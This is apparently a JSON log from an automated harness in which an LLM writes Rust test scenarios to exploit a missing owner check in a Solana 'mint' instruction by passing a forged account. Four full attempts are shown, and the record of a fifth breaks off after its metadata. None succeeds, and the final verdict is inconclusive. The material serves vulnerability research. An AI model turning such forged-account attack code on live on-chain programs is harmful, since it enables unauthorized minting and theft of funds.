@@ -1,0 +1,326 @@
+{
+  "category": "OWNER",
+  "verdict": "inconclusive",
+  "exploit_successful": false,
+  "attack_result": "UnknownError(ExternalAccountDataModified)",
+  "reason": "o baseline 'mint legitimo na conta do programa' falhou com UnknownError(ProgramFailedToComplete); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)",
+  "attempts_used": 5,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2387,
+        "completion_tokens": 797,
+        "latency_s": 4.39
+      },
+      "raw": "{\n  \"plan\": \"O programa `mint` (Pinocchio) recebe `accounts[0]` como `ledger` e le/grava bytes 40..56 sem verificar o owner. O baseline usa uma conta ledger legitima (dono = program_id) com supply/balance iniciais, provando que o cenario esta correto. O ataque substitui essa conta por uma conta forjada cujo owner e o atacante (System Program), com os mesmos bytes iniciais, e chama `mint` com o mesmo amount. O efeito medido e que a conta forjada teve supply/balance incrementados, demonstrando que o programa aceitou e modificou uma conta que nao lhe pertence.\",\n  \"scenario\": \"let program_id = env.program_id;\\n\\n// Conta ledger legitima: dono = program_id, com supply/balance iniciais nos offsets 40..56.\\nlet mut legit_data = vec![0u8; 64];\\nlegit_data[40..48].copy_from_slice(&100u64.to_le_bytes());\\nlegit_data[48..56].copy_from_slice(&50u64.to_le_bytes());\\nlet legit_ledger = account(&program_id, &legit_data, None);\\n\\n// Conta forjada pelo atacante: dono = System Program (diferente do programa), mesmos bytes iniciais.\\nlet mut forged_data = vec![0u8; 64];\\nforged_data[40..48].copy_from_slice(&100u64.to_le_bytes());\\nforged_data[48..56].copy_from_slice(&50u64.to_le_bytes());\\nlet forged_ledger = account(&solana_sdk::system_program::id(), &forged_data, None);\\n\\nlet amount: u64 = 7;\\nlet mut ix_data = vec![0u8]; // IX_MINT\\nix_data.extend_from_slice(&amount.to_le_bytes());\\n\\n// Baseline: uso legitimo com a conta do programa.\\nlet ix_legit = env.raw_ix(&ix_data, &[AccountMeta::new(program_id, false)]);\\nlet contas_legit = vec![(program_id, legit_ledger.clone())];\\nlet r_base = env.baseline(\\\"mint legitimo na conta do programa\\\", &ix_legit, &contas_legit);\\n\\n// Ataque: mesma instrucao, mas accounts[0] e a conta forjada (owner diferente).\\nlet ix_attack = env.raw_ix(&ix_data, &[AccountMeta::new(solana_sdk::system_program::id(), false)]);\\nlet contas_attack = vec![(solana_sdk::system_program::id(), forged_ledger.clone())];\\nlet r = env.attack(\\\"mint em conta forjada com owner do atacante\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let d = after(&r, &solana_sdk::system_program::id()).data();\\n    let supply = read_u64(d, 40);\\n    let balance = read_u64(d, 48);\\n    env.effect(\\\"supply da conta forjada foi incrementado pelo programa\\\", supply == 107);\\n    env.effect(\\\"balance da conta forjada foi incrementado pelo programa\\\", balance == 57);\\n}\"\n}",
+      "plan": "O programa `mint` (Pinocchio) recebe `accounts[0]` como `ledger` e le/grava bytes 40..56 sem verificar o owner. O baseline usa uma conta ledger legitima (dono = program_id) com supply/balance iniciais, provando que o cenario esta correto. O ataque substitui essa conta por uma conta forjada cujo owner e o atacante (System Program), com os mesmos bytes iniciais, e chama `mint` com o mesmo amount. O efeito medido e que a conta forjada teve supply/balance incrementados, demonstrando que o programa aceitou e modificou uma conta que nao lhe pertence.",
+      "scenario": "let program_id = env.program_id;\n\n// Conta ledger legitima: dono = program_id, com supply/balance iniciais nos offsets 40..56.\nlet mut legit_data = vec![0u8; 64];\nlegit_data[40..48].copy_from_slice(&100u64.to_le_bytes());\nlegit_data[48..56].copy_from_slice(&50u64.to_le_bytes());\nlet legit_ledger = account(&program_id, &legit_data, None);\n\n// Conta forjada pelo atacante: dono = System Program (diferente do programa), mesmos bytes iniciais.\nlet mut forged_data = vec![0u8; 64];\nforged_data[40..48].copy_from_slice(&100u64.to_le_bytes());\nforged_data[48..56].copy_from_slice(&50u64.to_le_bytes());\nlet forged_ledger = account(&solana_sdk::system_program::id(), &forged_data, None);\n\nlet amount: u64 = 7;\nlet mut ix_data = vec![0u8]; // IX_MINT\nix_data.extend_from_slice(&amount.to_le_bytes());\n\n// Baseline: uso legitimo com a conta do programa.\nlet ix_legit = env.raw_ix(&ix_data, &[AccountMeta::new(program_id, false)]);\nlet contas_legit = vec![(program_id, legit_ledger.clone())];\nlet r_base = env.baseline(\"mint legitimo na conta do programa\", &ix_legit, &contas_legit);\n\n// Ataque: mesma instrucao, mas accounts[0] e a conta forjada (owner diferente).\nlet ix_attack = env.raw_ix(&ix_data, &[AccountMeta::new(solana_sdk::system_program::id(), false)]);\nlet contas_attack = vec![(solana_sdk::system_program::id(), forged_ledger.clone())];\nlet r = env.attack(\"mint em conta forjada com owner do atacante\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let d = after(&r, &solana_sdk::system_program::id()).data();\n    let supply = read_u64(d, 40);\n    let balance = read_u64(d, 48);\n    env.effect(\"supply da conta forjada foi incrementado pelo programa\", supply == 107);\n    env.effect(\"balance da conta forjada foi incrementado pelo programa\", balance == 57);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n   --> tests/attempt.rs:28:41\n    |\n 28 | ... env.raw_ix(&ix_data, &[AccountMeta::new(program_id, false)]);\n    |         ------           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 1]`\n    |         |\n    |         arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<dynamic_harness::AccountMeta>`\n            found reference `&[dynamic_harness::AccountMeta; 1]`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:33:42\n    |\n 33 | ...nv.raw_ix(&ix_data, &[AccountMeta::new(solana_sdk::system_program::id(), false)]);\n    |       ------           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 1]`\n    |       |\n    |       arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<dynamic_harness::AccountMeta>`\n            found reference `&[dynamic_harness::AccountMeta; 1]`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:28:41\n    |\n 28 | ... env.raw_ix(&ix_data, &[AccountMeta::new(program_id, false)]);\n    |         ------           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 1]`\n    |         |\n    |         arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<dynamic_harness::AccountMeta>`\n            found reference `&[dynamic_harness::AccountMeta; 1]`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:33:42\n    |\n 33 | ...nv.raw_ix(&ix_data, &[AccountMeta::new(solana_sdk::system_program::id(), false)]);\n    |       ------           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 1]`\n    |       |\n    |       arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<dynamic_harness::AccountMeta>`\n            found reference `&[dynamic_harness::AccountMeta; 1]`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3343,
+        "completion_tokens": 755,
+        "latency_s": 3.71
+      },
+      "raw": "{\n  \"plan\": \"Preparo uma conta ledger legítima com dono = program_id e bytes forjados nos offsets 40..56, e uma conta forjada com dono = System Program. O baseline executa a instrução mint na conta legítima, provando que o cenário está montado. O ataque executa a mesma instrução passando a conta forjada como accounts[0], com owner diferente do programa. O efeito mede se o programa aceitou a conta forjada e incrementou supply/balance nela.\",\n  \"scenario\": \"let program_id = env.program_id;\\n\\n// Conta ledger legitima: dono = program_id, com supply/balance iniciais nos offsets 40..56.\\nlet mut legit_data = vec![0u8; 64];\\nlegit_data[40..48].copy_from_slice(&100u64.to_le_bytes());\\nlegit_data[48..56].copy_from_slice(&50u64.to_le_bytes());\\nlet legit_ledger = account(&program_id, &legit_data, None);\\n\\n// Conta forjada pelo atacante: dono = System Program (diferente do programa), mesmos bytes iniciais.\\nlet mut forged_data = vec![0u8; 64];\\nforged_data[40..48].copy_from_slice(&100u64.to_le_bytes());\\nforged_data[48..56].copy_from_slice(&50u64.to_le_bytes());\\nlet forged_ledger = account(&solana_sdk::system_program::id(), &forged_data, None);\\n\\nlet amount: u64 = 7;\\nlet mut ix_data = vec![0u8]; // IX_MINT\\nix_data.extend_from_slice(&amount.to_le_bytes());\\n\\n// Baseline: uso legitimo com a conta do programa.\\nlet ix_legit = env.raw_ix(&ix_data, vec![AccountMeta::new(program_id, false)]);\\nlet contas_legit = vec![(program_id, legit_ledger.clone())];\\nlet r_base = env.baseline(\\\"mint legitimo na conta do programa\\\", &ix_legit, &contas_legit);\\n\\n// Ataque: mesma instrucao, mas accounts[0] e a conta forjada (owner diferente).\\nlet ix_attack = env.raw_ix(&ix_data, vec![AccountMeta::new(solana_sdk::system_program::id(), false)]);\\nlet contas_attack = vec![(solana_sdk::system_program::id(), forged_ledger.clone())];\\nlet r = env.attack(\\\"mint em conta forjada com owner do atacante\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let d = after(&r, &solana_sdk::system_program::id()).data();\\n    let supply = read_u64(d, 40);\\n    let balance = read_u64(d, 48);\\n    env.effect(\\\"supply da conta forjada foi incrementado pelo programa\\\", supply == 107);\\n    env.effect(\\\"balance da conta forjada foi incrementado pelo programa\\\", balance == 57);\\n}\"\n}",
+      "plan": "Preparo uma conta ledger legítima com dono = program_id e bytes forjados nos offsets 40..56, e uma conta forjada com dono = System Program. O baseline executa a instrução mint na conta legítima, provando que o cenário está montado. O ataque executa a mesma instrução passando a conta forjada como accounts[0], com owner diferente do programa. O efeito mede se o programa aceitou a conta forjada e incrementou supply/balance nela.",
+      "scenario": "let program_id = env.program_id;\n\n// Conta ledger legitima: dono = program_id, com supply/balance iniciais nos offsets 40..56.\nlet mut legit_data = vec![0u8; 64];\nlegit_data[40..48].copy_from_slice(&100u64.to_le_bytes());\nlegit_data[48..56].copy_from_slice(&50u64.to_le_bytes());\nlet legit_ledger = account(&program_id, &legit_data, None);\n\n// Conta forjada pelo atacante: dono = System Program (diferente do programa), mesmos bytes iniciais.\nlet mut forged_data = vec![0u8; 64];\nforged_data[40..48].copy_from_slice(&100u64.to_le_bytes());\nforged_data[48..56].copy_from_slice(&50u64.to_le_bytes());\nlet forged_ledger = account(&solana_sdk::system_program::id(), &forged_data, None);\n\nlet amount: u64 = 7;\nlet mut ix_data = vec![0u8]; // IX_MINT\nix_data.extend_from_slice(&amount.to_le_bytes());\n\n// Baseline: uso legitimo com a conta do programa.\nlet ix_legit = env.raw_ix(&ix_data, vec![AccountMeta::new(program_id, false)]);\nlet contas_legit = vec![(program_id, legit_ledger.clone())];\nlet r_base = env.baseline(\"mint legitimo na conta do programa\", &ix_legit, &contas_legit);\n\n// Ataque: mesma instrucao, mas accounts[0] e a conta forjada (owner diferente).\nlet ix_attack = env.raw_ix(&ix_data, vec![AccountMeta::new(solana_sdk::system_program::id(), false)]);\nlet contas_attack = vec![(solana_sdk::system_program::id(), forged_ledger.clone())];\nlet r = env.attack(\"mint em conta forjada com owner do atacante\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let d = after(&r, &solana_sdk::system_program::id()).data();\n    let supply = read_u64(d, 40);\n    let balance = read_u64(d, 48);\n    env.effect(\"supply da conta forjada foi incrementado pelo programa\", supply == 107);\n    env.effect(\"balance da conta forjada foi incrementado pelo programa\", balance == 57);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "mint legitimo na conta do programa",
+            "result": "UnknownError(ProgramFailedToComplete)",
+            "compute_units": 344,
+            "account_flags": "-w",
+            "ix_head": "0007000000000000",
+            "accounts": [
+              {
+                "key": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 64,
+                "head": "0000000000000000",
+                "digest": "150884c282a7e966",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "mint em conta forjada com owner do atacante",
+            "result": "UnknownError(ExternalAccountDataModified)",
+            "compute_units": 104,
+            "account_flags": "-w",
+            "ix_head": "0007000000000000",
+            "accounts": [
+              {
+                "key": "11111111111111111111111111111111",
+                "signer": false,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 64,
+                "head": "0000000000000000",
+                "digest": "150884c282a7e966",
+                "post": "00000000000000000000000000000000000000000000000000000000000000000000000000000000640000000000000032000000000000000000000000000000"
+              }
+            ]
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 344 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: SBF program panicked",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 104 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: instruction modified data of an account it does not own"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o baseline 'mint legitimo na conta do programa' falhou com UnknownError(ProgramFailedToComplete); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    },
+    {
+      "attempt": 3,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3060,
+        "completion_tokens": 814,
+        "latency_s": 4.06
+      },
+      "raw": "{\n  \"plan\": \"O baseline falhou porque a conta ledger precisa ser gravavel e o programa pinocchio provavelmente exige que a conta seja passada como writable; alem disso, o harness pode estar tratando a conta como nao assinante. Vou montar a conta ledger com owner = program_id e dados de 64 bytes com supply/balance nos offsets 40..56, e passar a instrucao com AccountMeta::new(program_id, false) para indicar writable. O ataque usa a mesma instrucao, mas com accounts[0] sendo uma conta cujo owner e o System Program (diferente do programa), contendo os mesmos bytes forjados. O efeito mede se o programa aceitou a conta forjada e incrementou supply/balance nela.\",\n  \"scenario\": \"let program_id = env.program_id;\\n\\n// Conta ledger legitima: dono = program_id, com supply/balance iniciais nos offsets 40..56.\\nlet mut legit_data = vec![0u8; 64];\\nlegit_data[40..48].copy_from_slice(&100u64.to_le_bytes());\\nlegit_data[48..56].copy_from_slice(&50u64.to_le_bytes());\\nlet legit_ledger = account(&program_id, &legit_data, None);\\n\\n// Conta forjada pelo atacante: dono = System Program (diferente do programa), mesmos bytes iniciais.\\nlet mut forged_data = vec![0u8; 64];\\nforged_data[40..48].copy_from_slice(&100u64.to_le_bytes());\\nforged_data[48..56].copy_from_slice(&50u64.to_le_bytes());\\nlet forged_ledger = account(&solana_sdk::system_program::id(), &forged_data, None);\\n\\nlet amount: u64 = 7;\\nlet mut ix_data = vec![0u8]; // IX_MINT\\nix_data.extend_from_slice(&amount.to_le_bytes());\\n\\n// Baseline: uso legitimo com a conta do programa (writable).\\nlet ix_legit = env.raw_ix(&ix_data, vec![AccountMeta::new(program_id, false)]);\\nlet contas_legit = vec![(program_id, legit_ledger.clone())];\\nlet r_base = env.baseline(\\\"mint legitimo na conta do programa\\\", &ix_legit, &contas_legit);\\n\\n// Ataque: mesma instrucao, mas accounts[0] e a conta forjada (owner diferente).\\nlet ix_attack = env.raw_ix(&ix_data, vec![AccountMeta::new(solana_sdk::system_program::id(), false)]);\\nlet contas_attack = vec![(solana_sdk::system_program::id(), forged_ledger.clone())];\\nlet r = env.attack(\\\"mint em conta forjada com owner do atacante\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let d = after(&r, &solana_sdk::system_program::id()).data();\\n    let supply = read_u64(d, 40);\\n    let balance = read_u64(d, 48);\\n    env.effect(\\\"supply da conta forjada foi incrementado pelo programa\\\", supply == 107);\\n    env.effect(\\\"balance da conta forjada foi incrementado pelo programa\\\", balance == 57);\\n}\"\n}",
+      "plan": "O baseline falhou porque a conta ledger precisa ser gravavel e o programa pinocchio provavelmente exige que a conta seja passada como writable; alem disso, o harness pode estar tratando a conta como nao assinante. Vou montar a conta ledger com owner = program_id e dados de 64 bytes com supply/balance nos offsets 40..56, e passar a instrucao com AccountMeta::new(program_id, false) para indicar writable. O ataque usa a mesma instrucao, mas com accounts[0] sendo uma conta cujo owner e o System Program (diferente do programa), contendo os mesmos bytes forjados. O efeito mede se o programa aceitou a conta forjada e incrementou supply/balance nela.",
+      "scenario": "let program_id = env.program_id;\n\n// Conta ledger legitima: dono = program_id, com supply/balance iniciais nos offsets 40..56.\nlet mut legit_data = vec![0u8; 64];\nlegit_data[40..48].copy_from_slice(&100u64.to_le_bytes());\nlegit_data[48..56].copy_from_slice(&50u64.to_le_bytes());\nlet legit_ledger = account(&program_id, &legit_data, None);\n\n// Conta forjada pelo atacante: dono = System Program (diferente do programa), mesmos bytes iniciais.\nlet mut forged_data = vec![0u8; 64];\nforged_data[40..48].copy_from_slice(&100u64.to_le_bytes());\nforged_data[48..56].copy_from_slice(&50u64.to_le_bytes());\nlet forged_ledger = account(&solana_sdk::system_program::id(), &forged_data, None);\n\nlet amount: u64 = 7;\nlet mut ix_data = vec![0u8]; // IX_MINT\nix_data.extend_from_slice(&amount.to_le_bytes());\n\n// Baseline: uso legitimo com a conta do programa (writable).\nlet ix_legit = env.raw_ix(&ix_data, vec![AccountMeta::new(program_id, false)]);\nlet contas_legit = vec![(program_id, legit_ledger.clone())];\nlet r_base = env.baseline(\"mint legitimo na conta do programa\", &ix_legit, &contas_legit);\n\n// Ataque: mesma instrucao, mas accounts[0] e a conta forjada (owner diferente).\nlet ix_attack = env.raw_ix(&ix_data, vec![AccountMeta::new(solana_sdk::system_program::id(), false)]);\nlet contas_attack = vec![(solana_sdk::system_program::id(), forged_ledger.clone())];\nlet r = env.attack(\"mint em conta forjada com owner do atacante\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let d = after(&r, &solana_sdk::system_program::id()).data();\n    let supply = read_u64(d, 40);\n    let balance = read_u64(d, 48);\n    env.effect(\"supply da conta forjada foi incrementado pelo programa\", supply == 107);\n    env.effect(\"balance da conta forjada foi incrementado pelo programa\", balance == 57);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "mint legitimo na conta do programa",
+            "result": "UnknownError(ProgramFailedToComplete)",
+            "compute_units": 344,
+            "account_flags": "-w",
+            "ix_head": "0007000000000000",
+            "accounts": [
+              {
+                "key": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 64,
+                "head": "0000000000000000",
+                "digest": "150884c282a7e966",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "mint em conta forjada com owner do atacante",
+            "result": "UnknownError(ExternalAccountDataModified)",
+            "compute_units": 104,
+            "account_flags": "-w",
+            "ix_head": "0007000000000000",
+            "accounts": [
+              {
+                "key": "11111111111111111111111111111111",
+                "signer": false,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 64,
+                "head": "0000000000000000",
+                "digest": "150884c282a7e966",
+                "post": "00000000000000000000000000000000000000000000000000000000000000000000000000000000640000000000000032000000000000000000000000000000"
+              }
+            ]
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 344 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: SBF program panicked",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 104 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: instruction modified data of an account it does not own"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o baseline 'mint legitimo na conta do programa' falhou com UnknownError(ProgramFailedToComplete); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    },
+    {
+      "attempt": 4,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3063,
+        "completion_tokens": 779,
+        "latency_s": 3.97
+      },
+      "raw": "{\"plan\": \"O baseline falhou porque a conta ledger precisa ter dados de pelo menos 56 bytes e ser passada como writable; o erro ProgramFailedToComplete sugere que o programa tentou ler data[40..56] de uma conta com dados insuficientes ou que a conta nao foi marcada como writable. Vou montar uma conta ledger com 64 bytes de dados, dono = program_id, e passar como writable no baseline. No ataque, fornecerei uma conta com dono diferente (System Program) e mesmos bytes forjados, esperando que o programa aceite e incremente supply/balance sem verificar o owner.\", \"scenario\": \"let program_id = env.program_id;\\n\\n// Conta ledger legitima: dono = program_id, com supply/balance iniciais nos offsets 40..56.\\nlet mut legit_data = vec![0u8; 64];\\nlegit_data[40..48].copy_from_slice(&100u64.to_le_bytes());\\nlegit_data[48..56].copy_from_slice(&50u64.to_le_bytes());\\nlet legit_ledger = account(&program_id, &legit_data, None);\\n\\n// Conta forjada pelo atacante: dono = System Program (diferente do programa), mesmos bytes iniciais.\\nlet mut forged_data = vec![0u8; 64];\\nforged_data[40..48].copy_from_slice(&100u64.to_le_bytes());\\nforged_data[48..56].copy_from_slice(&50u64.to_le_bytes());\\nlet forged_ledger = account(&solana_sdk::system_program::id(), &forged_data, None);\\n\\nlet amount: u64 = 7;\\nlet mut ix_data = vec![0u8]; // IX_MINT\\nix_data.extend_from_slice(&amount.to_le_bytes());\\n\\n// Baseline: uso legitimo com a conta do programa (writable).\\nlet ix_legit = env.raw_ix(&ix_data, vec![AccountMeta::new(program_id, false)]);\\nlet contas_legit = vec![(program_id, legit_ledger.clone())];\\nlet r_base = env.baseline(\\\"mint legitimo na conta do programa\\\", &ix_legit, &contas_legit);\\n\\n// Ataque: mesma instrucao, mas accounts[0] e a conta forjada (owner diferente).\\nlet ix_attack = env.raw_ix(&ix_data, vec![AccountMeta::new(solana_sdk::system_program::id(), false)]);\\nlet contas_attack = vec![(solana_sdk::system_program::id(), forged_ledger.clone())];\\nlet r = env.attack(\\\"mint em conta forjada com owner do atacante\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let d = after(&r, &solana_sdk::system_program::id()).data();\\n    let supply = read_u64(d, 40);\\n    let balance = read_u64(d, 48);\\n    env.effect(\\\"supply da conta forjada foi incrementado pelo programa\\\", supply == 107);\\n    env.effect(\\\"balance da conta forjada foi incrementado pelo programa\\\", balance == 57);\\n}\"}",
+      "plan": "O baseline falhou porque a conta ledger precisa ter dados de pelo menos 56 bytes e ser passada como writable; o erro ProgramFailedToComplete sugere que o programa tentou ler data[40..56] de uma conta com dados insuficientes ou que a conta nao foi marcada como writable. Vou montar uma conta ledger com 64 bytes de dados, dono = program_id, e passar como writable no baseline. No ataque, fornecerei uma conta com dono diferente (System Program) e mesmos bytes forjados, esperando que o programa aceite e incremente supply/balance sem verificar o owner.",
+      "scenario": "let program_id = env.program_id;\n\n// Conta ledger legitima: dono = program_id, com supply/balance iniciais nos offsets 40..56.\nlet mut legit_data = vec![0u8; 64];\nlegit_data[40..48].copy_from_slice(&100u64.to_le_bytes());\nlegit_data[48..56].copy_from_slice(&50u64.to_le_bytes());\nlet legit_ledger = account(&program_id, &legit_data, None);\n\n// Conta forjada pelo atacante: dono = System Program (diferente do programa), mesmos bytes iniciais.\nlet mut forged_data = vec![0u8; 64];\nforged_data[40..48].copy_from_slice(&100u64.to_le_bytes());\nforged_data[48..56].copy_from_slice(&50u64.to_le_bytes());\nlet forged_ledger = account(&solana_sdk::system_program::id(), &forged_data, None);\n\nlet amount: u64 = 7;\nlet mut ix_data = vec![0u8]; // IX_MINT\nix_data.extend_from_slice(&amount.to_le_bytes());\n\n// Baseline: uso legitimo com a conta do programa (writable).\nlet ix_legit = env.raw_ix(&ix_data, vec![AccountMeta::new(program_id, false)]);\nlet contas_legit = vec![(program_id, legit_ledger.clone())];\nlet r_base = env.baseline(\"mint legitimo na conta do programa\", &ix_legit, &contas_legit);\n\n// Ataque: mesma instrucao, mas accounts[0] e a conta forjada (owner diferente).\nlet ix_attack = env.raw_ix(&ix_data, vec![AccountMeta::new(solana_sdk::system_program::id(), false)]);\nlet contas_attack = vec![(solana_sdk::system_program::id(), forged_ledger.clone())];\nlet r = env.attack(\"mint em conta forjada com owner do atacante\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let d = after(&r, &solana_sdk::system_program::id()).data();\n    let supply = read_u64(d, 40);\n    let balance = read_u64(d, 48);\n    env.effect(\"supply da conta forjada foi incrementado pelo programa\", supply == 107);\n    env.effect(\"balance da conta forjada foi incrementado pelo programa\", balance == 57);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "mint legitimo na conta do programa",
+            "result": "UnknownError(ProgramFailedToComplete)",
+            "compute_units": 344,
+            "account_flags": "-w",
+            "ix_head": "0007000000000000",
+            "accounts": [
+              {
+                "key": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 64,
+                "head": "0000000000000000",
+                "digest": "150884c282a7e966",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "mint em conta forjada com owner do atacante",
+            "result": "UnknownError(ExternalAccountDataModified)",
+            "compute_units": 104,
+            "account_flags": "-w",
+            "ix_head": "0007000000000000",
+            "accounts": [
+              {
+                "key": "11111111111111111111111111111111",
+                "signer": false,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 64,
+                "head": "0000000000000000",
+                "digest": "150884c282a7e966",
+                "post": "00000000000000000000000000000000000000000000000000000000000000000000000000000000640000000000000032000000000000000000000000000000"
+              }
+            ]
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 344 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: SBF program panicked",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 104 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: instruction modified data of an account it does not own"
+        ],
+        "elapsed_s": 1.6
+      },
+      "verdict": null,
+      "reason": "o baseline 'mint legitimo na conta do programa' falhou com UnknownError(ProgramFailedToComplete); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    },
+    {
+      "attempt": 5,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3063,
+        "completion_tokens": 799,
+        "latency_s": 4.22
+      },
